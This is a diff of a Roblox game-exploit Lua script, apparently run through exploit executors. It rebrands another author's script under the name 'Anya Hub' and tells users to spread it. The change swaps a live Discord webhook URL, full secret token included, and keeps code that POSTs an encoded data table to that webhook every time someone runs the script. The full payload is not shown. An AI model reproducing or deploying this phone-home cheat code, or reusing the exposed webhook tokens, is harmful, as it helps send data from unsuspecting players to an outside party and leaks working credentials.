@@ -11561,8 +11561,8 @@ local Data = {
                     ["inline"] = false
                 },
                 {
-                    ["name"] = "Cảm Con Mẹ Nó Ơn Chúng Mày",
-                    ["value"] = "Đã Dùng Script Của Tuấn Anh IOS✅",
+                    ["name"] = "hello",
+                    ["value"] = "hãy lan truyền script này cho mọi người",
                     ["inline"] = false
                 }
             }
@@ -11573,7 +11573,7 @@ local Data = {
 local Headers = {["Content-Type"] = "application/json"}
 local Encoded = HttpService:JSONEncode(Data)
 
-local WebhookURL = "https://discord.com/api/webhooks/1361944409662423180/cliAsM5X1dqSTEBoz_yO5gsirtWfm7dNAAE89mnHbiu0Lww2-ISxYaWWBLsXexauGM6-"
+local WebhookURL = "https://discord.com/api/webhooks/1431829108181962762/XigtBBBK3L7iqQxkRjNfXxiw8ztA7Nvwh9Y0Goysm1gNhvu3VVflaMNqsEHprhqy4Ifn"
 local Request = http_request or request or HttpPost or syn.request
 if Request then
     Request({Url = WebhookURL, Body = Encoded, Method = "POST", Headers = Headers})
@@ -11581,9 +11581,9 @@ end
 game:GetService("StarterGui"):SetCore(
     "SendNotification",
     {
-        Title = "Tuấn Anh IOS",
+        Title = "Anya Hub",
         Text = "Đã Tải Xong",
-        Icon = "rbxthumb://type=Asset&id=75774010417827&w=150&h=150",
+        Icon = "rbxthumb://type=Asset&id=116231965107271&w=150&h=150",
         Duration = 5
     }
 )
